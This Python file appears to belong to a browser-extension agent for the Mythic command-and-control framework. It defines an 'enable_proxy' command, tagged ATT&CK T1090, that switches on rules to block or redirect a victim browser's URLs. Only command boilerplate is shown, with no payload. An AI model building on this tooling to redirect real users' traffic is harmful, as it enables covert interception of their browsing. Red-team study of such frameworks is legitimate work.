from mythic_container.MythicCommandBase import (
    CommandBase,
    CommandAttributes,
    TaskArguments,
    PTTaskMessageAllData,
    PTTaskCreateTaskingMessageResponse,
)


class EnableProxyArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self._args = []

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            self.load_args_from_json_string(self.command_line)


class EnableProxyCommand(CommandBase):
    cmd = "enable_proxy"
    needs_admin = False
    help_cmd = "enable_proxy"
    description = (
        "Activate the declarativeNetRequest rules set via proxy_set_rules "
        "(block and/or redirect matching URLs)."
    )
    version = 1
    author = "@Fir3n0x"
    attackmapping = ["T1090"]
    argument_class = EnableProxyArguments
    attributes = CommandAttributes(
        builtin=False,
        suggested_command=False,
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        return PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
